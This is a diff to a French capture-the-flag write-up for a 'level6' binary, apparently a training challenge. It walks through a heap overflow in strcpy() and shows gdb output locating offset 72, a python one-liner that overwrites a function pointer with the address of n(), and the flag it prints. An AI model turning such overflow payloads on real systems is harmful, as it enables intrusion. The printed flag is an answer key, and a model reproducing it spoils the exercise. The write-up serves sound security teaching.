@@ -148,6 +148,22 @@ La fonction main() fait deux appels à malloc():
 - malloc(64) où on va venir copier notre input avec strcpy()
 - malloc(4) oû on va stocker l'adresse de la fonction à exécuter à <main+84> (en l'occurence l'adresse de m())
 
-La fonction m() affiche "Nope" et la fonction n() affiche le contenu du fichier .pass mais n'est pas appelée, on comprend que l'on va devoir profiter de [la vulérabilité de strcpy() à un buffer overflow](https://www.cisa.gov/uscert/bsi/articles/knowledge/coding-practices/strcpy-and-strcat) pour venir écrire l'adresse de n() dans le malloc(4).
+La fonction m() affiche "Nope" et la fonction n() affiche le contenu du fichier .pass mais n'est pas appelée.
+On comprend que l'on va devoir profiter de [la vulérabilité de strcpy() à un buffer overflow](https://www.cisa.gov/uscert/bsi/articles/knowledge/coding-practices/strcpy-and-strcat) pour réécrire l'eip ave l'adresse de n().
 
+On cherche l'offset:
+- `gdb level6`
+  - `run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A`
+    ```
+    Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 
+    Program received signal SIGSEGV, Segmentation fault.
+    0x41346341 in ?? ()
+    ```
+    - [Le générateur](https://wiremask.eu/tools/buffer-overflow-pattern-generator) nous indique qu'on atteint l'offset à 72
+ 
+ On Lance ./level6 avec un payload avec 72 octets random, puis l'adresse de n() en little endian:
+ - `./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')`
+  ```
+  f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+  ```
